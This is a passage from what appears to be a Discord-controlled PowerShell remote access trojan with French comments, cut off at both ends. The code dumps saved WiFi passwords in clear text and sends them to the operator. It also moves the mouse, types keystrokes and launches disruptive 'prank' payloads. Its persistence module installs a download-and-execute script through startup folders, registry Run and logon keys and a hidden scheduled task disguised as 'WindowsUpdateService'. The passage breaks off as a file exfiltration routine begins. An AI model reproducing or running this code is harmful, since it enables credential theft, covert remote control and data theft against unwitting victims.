                $currentNetwork = [PSCustomObject]@{
                    SSID = $matches[1].Trim()
                    Signal = 0  # Initialiser à 0 pour le tri numérique
                    Band = "N/A"
                    Security = "N/A"
                }
            }
            elseif ($currentNetwork) {
                if ($line -match 'Signal\s*:\s*(\d+)%') {
                    $currentNetwork.Signal = [int]$matches[1]  # Stocker comme nombre pour le tri
                }
                elseif ($line -match 'Radio type\s*:\s*(.+)$') {
                    $currentNetwork.Band = $matches[1].Trim()
                }
                elseif ($line -match 'Authentication\s*:\s*(.+)$') {
                    $currentNetwork.Security = $matches[1].Trim()
                }
            }
        }
        
        if ($currentNetwork) {
            $networks += $currentNetwork
        }
        
        # Obtenir les mots de passe des réseaux WiFi enregistrés
        $savedProfiles = @{}
        try {
            $wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile"
            if ($wifiProfiles) {
                foreach ($profile in $wifiProfiles) {
                    $profileName = ($profile -split ":")[1].Trim()
                    $passwordOutput = netsh wlan show profile name="$profileName" key=clear 2>$null | Select-String "Key Content"
                    if ($passwordOutput) {
                        $password = ($passwordOutput -split ":")[1].Trim()
                        $savedProfiles[$profileName] = $password
                    }
                    else {
                        $savedProfiles[$profileName] = "No password"
                    }
                }
            }
        }
        catch {
            # Ignorer les erreurs
        }
        
        # Formater proprement pour Discord en liste
        if ($networks -and $networks.Count -gt 0) {
            # Trier par signal décroissant
            $networks = $networks | Sort-Object -Property Signal -Descending
            
            $output = ":white_check_mark: **Nearby WiFi Networks:** ($($networks.Count) found)" + [Environment]::NewLine + [Environment]::NewLine
            
            $counter = 1
            foreach ($network in $networks) {
                $ssid = $network.SSID
                $signal = if ($network.Signal -gt 0) { "$($network.Signal)%" } else { "N/A" }
                $band = if ($network.Band -ne "N/A") { $network.Band } else { "N/A" }
                $security = if ($network.Security -ne "N/A") { $network.Security } else { "N/A" }
                
                # Chercher le mot de passe si le réseau est enregistré
                $password = "Not saved"
                if ($savedProfiles.ContainsKey($ssid)) {
                    $password = $savedProfiles[$ssid]
                }
                
                $output += "$counter. **$ssid**" + [Environment]::NewLine
                $output += "   - Signal: $signal" + [Environment]::NewLine
                $output += "   - Band: $band" + [Environment]::NewLine
                $output += "   - Security: $security" + [Environment]::NewLine
                $output += "   - Password: $password" + [Environment]::NewLine
                $output += [Environment]::NewLine
                
                $counter++
                
                # Limiter à 20 réseaux pour éviter les erreurs 400
                if ($counter -gt 20) {
                    if ($networks.Count -gt 20) {
                        $output += "... and $($networks.Count - 20) more network(s)" + [Environment]::NewLine
                    }
                    break
                }
            }
            
            sendMsg -Message $output
        }
        else {
            sendMsg -Message ":octagonal_sign: ``No WiFi networks found`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error scanning WiFi networks: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- MOUSE & KEYBOARD CONTROL FUNCTIONS ------------------------------------------------------------------------

Function GetMousePosition {
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class MousePosition {
            [DllImport("user32.dll")]
            public static extern bool GetCursorPos(out POINT lpPoint);
            
            [StructLayout(LayoutKind.Sequential)]
            public struct POINT {
                public int X;
                public int Y;
            }
        }
"@
        $point = New-Object MousePosition+POINT
        [MousePosition]::GetCursorPos([ref]$point) | Out-Null
        sendMsg -Message ":mouse: ``Mouse Position: X=$($point.X), Y=$($point.Y)`` :mouse:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error getting mouse position: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function MoveMouse {
    param([int]$X, [int]$Y)
    try {
        if (-not $X -or -not $Y) {
            sendMsg -Message ":octagonal_sign: ``Usage: MoveMouse -X 100 -Y 200`` :octagonal_sign:"
            return
        }
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class MouseControl {
            [DllImport("user32.dll")]
            public static extern bool SetCursorPos(int X, int Y);
        }
"@
        [MouseControl]::SetCursorPos($X, $Y) | Out-Null
        sendMsg -Message ":white_check_mark: ``Mouse moved to X=$X, Y=$Y`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error moving mouse: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function MouseClick {
    param([string]$Button = "left")
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class MouseClick {
            [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
            
            private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
            private const uint MOUSEEVENTF_LEFTUP = 0x04;
            private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
            private const uint MOUSEEVENTF_RIGHTUP = 0x10;
            
            public static void LeftClick() {
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            }
            
            public static void RightClick() {
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            }
        }
"@
        if ($Button -eq "left" -or $Button -eq "Left") {
            [MouseClick]::LeftClick()
            sendMsg -Message ":white_check_mark: ``Left click performed`` :white_check_mark:"
        }
        elseif ($Button -eq "right" -or $Button -eq "Right") {
            [MouseClick]::RightClick()
            sendMsg -Message ":white_check_mark: ``Right click performed`` :white_check_mark:"
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Usage: MouseClick -Button left|right`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error performing mouse click: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function TypeText {
    param([string]$Text)
    try {
        if ([string]::IsNullOrWhiteSpace($Text)) {
            sendMsg -Message ":octagonal_sign: ``Text is required. Usage: TypeText -Text \"your text\"`` :octagonal_sign:"
            return
        }
        Add-Type -AssemblyName System.Windows.Forms
        $Text = $Text -replace '`n', '{ENTER}' -replace '`r', '' -replace '`t', '{TAB}'
        [System.Windows.Forms.SendKeys]::SendWait($Text)
        sendMsg -Message ":white_check_mark: ``Text typed: $Text`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error typing text: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------

Function FakeUpdate {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
}

Function Windows93 {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
}

Function WindowsIdiot {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
}

Function SendHydra {
    Add-Type -AssemblyName System.Windows.Forms
    sendMsg -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
    function Create-Form {
        $form = New-Object Windows.Forms.Form; $form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ "; $form.Font = 'Microsoft Sans Serif,12,style=Bold'; $form.Size = New-Object Drawing.Size(300, 170); $form.StartPosition = 'Manual'; $form.BackColor = [System.Drawing.Color]::Black; $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog; $form.ControlBox = $false; $form.Font = 'Microsoft Sans Serif,12,style=bold'; $form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label; $Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear"; $Text.Font = 'Microsoft Sans Serif,14'; $Text.AutoSize = $true; $Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button; $Close.Text = "Close?"; $Close.Width = 120; $Close.Height = 35; $Close.BackColor = [System.Drawing.Color]::White; $Close.ForeColor = [System.Drawing.Color]::Black; $Close.DialogResult = [System.Windows.Forms.DialogResult]::OK; $Close.Location = New-Object System.Drawing.Point(85, 100); $Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close)); return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = PullMsg
        if ($messages -match "kill") {
            sendMsg -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function Message {
    param([string]$Message)
    
    if ([string]::IsNullOrWhiteSpace($Message)) {
        sendMsg -Message ":octagonal_sign: ``Message is required. Usage: Message -Message \"your message\"`` :octagonal_sign:"
        return
    }
    
    try {
        # Utiliser msg.exe pour afficher une popup
        msg.exe * "$Message"
        sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to send message: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function SoundSpam {
    param([Parameter()][int]$Interval = 3)
    sendMsg -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
    sendMsg -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
}

Function VoiceMessage([string]$Message) {
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
    sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
}

Function TextToSpeech {
    param([string]$Text)
    
    try {
        if ([string]::IsNullOrWhiteSpace($Text)) {
            sendMsg -Message ":octagonal_sign: ``Text is required. Usage: TextToSpeech -Text \"your message\"`` :octagonal_sign:"
            return
        }
        
        Add-Type -AssemblyName System.Speech -ErrorAction Stop
        $speechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        
        sendMsg -Message ":speaking_head: ``Speaking: $Text`` :speaking_head:"
        
        # Parler le texte
        $speechSynth.Speak($Text)
        
        # Nettoyer
        $speechSynth.Dispose()
        
        sendMsg -Message ":white_check_mark: ``Text-to-Speech completed`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Text-to-Speech failed: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function MinimizeAll {
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    sendMsg -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
}

Function EnableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 0
    Start-Sleep 1
    sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
}

Function DisableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
    Start-Sleep 1
    sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
}

Function ShortcutBomb {
    $n = 0
    while ($n -lt 50) {
        $num = Get-Random
        $AppLocation = "C:\Windows\System32\rundll32.exe"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
        $Shortcut.TargetPath = $AppLocation
        $Shortcut.Arguments = "shell32.dll,Control_RunDLL hotplug.dll"
        $Shortcut.IconLocation = "hotplug.dll,0"
        $Shortcut.Description = "Device Removal"
        $Shortcut.WorkingDirectory = "C:\Windows\System32"
        $Shortcut.Save()
        Start-Sleep 0.2
        $n++
    }
    sendMsg -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
}

Function Wallpaper {
    param ([string[]]$url)
    $outputPath = "$env:temp\img.jpg"; $wallpaperStyle = 2; IWR -Uri $url -OutFile $outputPath
    $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
    Add-Type -TypeDefinition $signature; $SPI_SETDESKWALLPAPER = 0x0014; $SPIF_UPDATEINIFILE = 0x01; $SPIF_SENDCHANGE = 0x02; [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
}

Function Goose {
    $url = "https://github.com/benzoXdev/assets/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}

Function ScreenParty {
    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
    sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
}

# --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------

Function AddPersistance {
    $successCount = 0
    $failedMethods = @()
    $persistenceMethods = @()
    
    # Chemin du script principal de persistance
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $scriptName = "copy.ps1"
    
    try {
        # Créer le contenu du script de persistance avec gestion d'erreurs robuste
        $scriptContent = @"
# Auto-generated persistence script
`$ErrorActionPreference = 'SilentlyContinue'
`$tk = `"$token`"
`$parent = `"$parent`"
Start-Sleep -Seconds 5
try {
    `$response = Invoke-WebRequest -Uri `$parent -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
    `$response.Content | Invoke-Expression
}
catch {
    # Si le téléchargement échoue, réessayer après 30 secondes
    Start-Sleep -Seconds 30
    try {
        `$response = Invoke-WebRequest -Uri `$parent -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        `$response.Content | Invoke-Expression
    }
    catch {
        # En cas d'échec, le script se termine silencieusement
        exit
    }
}
"@
        
        # Créer le script principal
        try {
            $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8 -ErrorAction Stop
            if (Test-Path $newScriptPath) {
                $persistenceMethods += "Script principal créé: $newScriptPath"
            }
        }
        catch {
            $failedMethods += "Script principal: $($_.Exception.Message)"
        }
        
        # ========== MÉTHODE 1: Startup Folder VBS (méthode existante améliorée) ==========
        try {
            $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
            $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Dim scriptPath
scriptPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes\copy.ps1"
If objFSO.FileExists(scriptPath) Then
    objShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File """ & scriptPath & """", 0, False
End If
"@
            $vbsContent | Out-File -FilePath $vbsPath -Force -Encoding ASCII -ErrorAction Stop
            if (Test-Path $vbsPath) {
                $successCount++
                $persistenceMethods += "Startup Folder VBS: $vbsPath"
            }
        }
        catch {
            $failedMethods += "Startup VBS: $($_.Exception.Message)"
        }
        
        # ========== MÉTHODE 2: HKCU Run Key (Registre) ==========
        try {
            $runKeyName = "WindowsUpdateService"
            $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $runCommand = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
            
            # Vérifier si la clé existe déjà
            $existing = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
            if ($existing) {
                Set-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runCommand -Force -ErrorAction Stop
            }
            else {
                New-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runCommand -PropertyType String -Force -ErrorAction Stop | Out-Null
            }
            
            # Vérifier que la valeur a été correctement enregistrée
            $verify = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
            if ($verify -and $verify.$runKeyName -eq $runCommand) {
                $successCount++
                $persistenceMethods += "HKCU Run Key: $runKeyName"
            }
            else {
                throw "Vérification échouée"
            }
        }
        catch {
            $failedMethods += "HKCU Run Key: $($_.Exception.Message)"
        }
        
        # ========== MÉTHODE 3: UserInitMprLogonScript (Registre) ==========
        try {
            $userInitKeyPath = "HKCU:\Environment"
            $userInitValueName = "UserInitMprLogonScript"
            $userInitCommand = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
            
            # Vérifier si la valeur existe déjà
            $existing = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
            if ($existing) {
                # Préserver la valeur existante et ajouter la nôtre
                $existingValue = $existing.$userInitValueName
                if ($existingValue -notlike "*$newScriptPath*") {
                    $userInitCommand = "$existingValue & $userInitCommand"
                }
                else {
                    $userInitCommand = $existingValue
                }
            }
            
            Set-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Value $userInitCommand -Force -ErrorAction Stop
            
            # Vérifier que la valeur a été correctement enregistrée
            $verify = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
            if ($verify -and $verify.$userInitValueName -like "*$newScriptPath*") {
                $successCount++
                $persistenceMethods += "UserInitMprLogonScript: $userInitValueName"
            }
            else {
                throw "Vérification échouée"
            }
        }
        catch {
            $failedMethods += "UserInitMprLogonScript: $($_.Exception.Message)"
        }
        
        # ========== MÉTHODE 4: Startup Folder LNK (Raccourci) ==========
        try {
            $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
            $targetPath = "powershell.exe"
            $arguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
            $workingDir = "$env:APPDATA\Microsoft\Windows\Themes"
            
            # Créer le raccourci via COM
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($lnkPath)
            $Shortcut.TargetPath = $targetPath
            $Shortcut.Arguments = $arguments
            $Shortcut.WorkingDirectory = $workingDir
            $Shortcut.WindowStyle = 7  # Minimized
            $Shortcut.IconLocation = "shell32.dll,1"
            $Shortcut.Description = "Windows Update Service"
            $Shortcut.Save()
            
            if (Test-Path $lnkPath) {
                $successCount++
                $persistenceMethods += "Startup Folder LNK: $lnkPath"
            }
            else {
                throw "Le fichier LNK n'a pas été créé"
            }
        }
        catch {
            $failedMethods += "Startup LNK: $($_.Exception.Message)"
        }
        
        # ========== MÉTHODE 5: Scheduled Task (si admin disponible, sinon ignoré) ==========
        try {
            $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
            if ($isAdmin) {
                $taskName = "WindowsUpdateService"
                $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
                $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
                $taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
                $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
                
                # Supprimer la tâche existante si elle existe
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
                
                # Créer la nouvelle tâche
                Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force -ErrorAction Stop | Out-Null
                
                $verify = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
                if ($verify) {
                    $successCount++
                    $persistenceMethods += "Scheduled Task: $taskName (Admin)"
                }
            }
        }
        catch {
            # Ignorer silencieusement si pas admin ou erreur
        }
        
        # Résumé des résultats
        $summary = "Persistance installée: $successCount méthode(s) activée(s)"
        if ($persistenceMethods.Count -gt 0) {
            $summary += "`nMéthodes installées:`n" + ($persistenceMethods -join "`n")
        }
        if ($failedMethods.Count -gt 0) {
            $summary += "`nÉchecs:`n" + ($failedMethods -join "`n")
        }
        
        if ($successCount -gt 0) {
            sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Échec de l'installation de la persistance. Aucune méthode n'a réussi.`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Erreur critique lors de l'ajout de la persistance: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function RemovePersistance {
    $removedCount = 0
    $removedMethods = @()
    $notFoundMethods = @()
    
    # ========== SUPPRESSION 1: Startup Folder VBS ==========
    $vbsPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs",
        "C:\Windows\Tasks\service.vbs"
    )
    foreach ($vbsPath in $vbsPaths) {
        if (Test-Path $vbsPath) {
            try {
                Remove-Item -Path $vbsPath -Force -ErrorAction Stop
                $removedCount++
                $removedMethods += "VBS supprimé: $vbsPath"
            }
            catch {
                $notFoundMethods += "Erreur suppression VBS $vbsPath : $($_.Exception.Message)"
            }
        }
    }
    
    # ========== SUPPRESSION 2: Script principal ==========
    $scriptPaths = @(
        "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1",
        "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
    )
    foreach ($scriptPath in $scriptPaths) {
        if (Test-Path $scriptPath) {
            try {
                Remove-Item -Path $scriptPath -Force -ErrorAction Stop
                $removedCount++
                $removedMethods += "Script supprimé: $scriptPath"
            }
            catch {
                $notFoundMethods += "Erreur suppression script $scriptPath : $($_.Exception.Message)"
            }
        }
    }
    
    # ========== SUPPRESSION 3: HKCU Run Key ==========
    try {
        $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $runKeyName = "WindowsUpdateService"
        
        $existing = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
        if ($existing) {
            Remove-ItemProperty -Path $runKeyPath -Name $runKeyName -Force -ErrorAction Stop
            $removedCount++
            $removedMethods += "HKCU Run Key supprimé: $runKeyName"
        }
    }
    catch {
        $notFoundMethods += "Erreur suppression HKCU Run Key: $($_.Exception.Message)"
    }
    
    # ========== SUPPRESSION 4: UserInitMprLogonScript ==========
    try {
        $userInitKeyPath = "HKCU:\Environment"
        $userInitValueName = "UserInitMprLogonScript"
        
        $existing = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
        if ($existing) {
            $currentValue = $existing.$userInitValueName
            $scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
            
            # Si la valeur contient notre script, la nettoyer
            if ($currentValue -like "*$scriptPath*") {
                # Retirer notre commande de la valeur
                $newValue = $currentValue -replace "[^&]*$scriptPath[^&]*", "" -replace "&&+", "&" -replace "^&+|&+$", ""
                
                if ([string]::IsNullOrWhiteSpace($newValue)) {
                    # Si la valeur est vide après nettoyage, supprimer la clé
                    Remove-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Force -ErrorAction Stop
                }
                else {
                    # Sinon, mettre à jour avec la valeur nettoyée
                    Set-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Value $newValue -Force -ErrorAction Stop
                }
                $removedCount++
                $removedMethods += "UserInitMprLogonScript nettoyé"
            }
        }
    }
    catch {
        $notFoundMethods += "Erreur suppression UserInitMprLogonScript: $($_.Exception.Message)"
    }
    
    # ========== SUPPRESSION 5: Startup Folder LNK ==========
    $lnkPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
    )
    foreach ($lnkPath in $lnkPaths) {
        if (Test-Path $lnkPath) {
            try {
                Remove-Item -Path $lnkPath -Force -ErrorAction Stop
                $removedCount++
                $removedMethods += "LNK supprimé: $lnkPath"
            }
            catch {
                $notFoundMethods += "Erreur suppression LNK $lnkPath : $($_.Exception.Message)"
            }
        }
    }
    
    # ========== SUPPRESSION 6: Scheduled Task (si admin) ==========
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        if ($isAdmin) {
            $taskName = "WindowsUpdateService"
            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            if ($task) {
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -Force -ErrorAction Stop
                $removedCount++
                $removedMethods += "Scheduled Task supprimé: $taskName"
            }
        }
    }
    catch {
        # Ignorer silencieusement
    }
    
    # Résumé des résultats
    if ($removedCount -gt 0) {
        $summary = "Persistance supprimée: $removedCount élément(s) retiré(s)"
        if ($removedMethods.Count -gt 0) {
            $summary += "`nÉléments supprimés:`n" + ($removedMethods -join "`n")
        }
        if ($notFoundMethods.Count -gt 0) {
            $summary += "`nAvertissements:`n" + ($notFoundMethods -join "`n")
        }
        sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
    }
    else {
        sendMsg -Message ":octagonal_sign: ``Aucune persistance trouvée à supprimer`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- USER FUNCTIONS ------------------------------------------------------------------------

Function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)
    
    try {
        # Message de démarrage simplifié (sans markdown complexe pour éviter erreurs 400)
        $startMsg = ":file_folder: Exfiltration Started :file_folder:"
        if ($Path) {
            $pathStr = $Path -join ', '
            if (($startMsg + " | Paths: " + $pathStr).Length -lt 1900) {
                $startMsg += " | Paths: $pathStr"
            }
        }
        if ($FileType) {
            $typeStr = $FileType -join ', '
            if (($startMsg + " | Types: " + $typeStr).Length -lt 1900) {
                $startMsg += " | Types: $typeStr"
            }
        }
        sendMsg -Message "``$startMsg``"
        
        $maxZipFileSize = 10MB
        $currentZipSize = 0
        $index = 1
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $dateStr = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
        $totalFiles = 0
        $totalSize = 0
        $filesProcessed = 0
        $filesSkipped = 0
        $fileList = @()  # Liste pour stocker les fichiers par archive
        
        # Nettoyer les anciens fichiers d'exfiltration s'ils existent
        Get-ChildItem -Path "$env:temp" -Filter "Loot*.zip" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
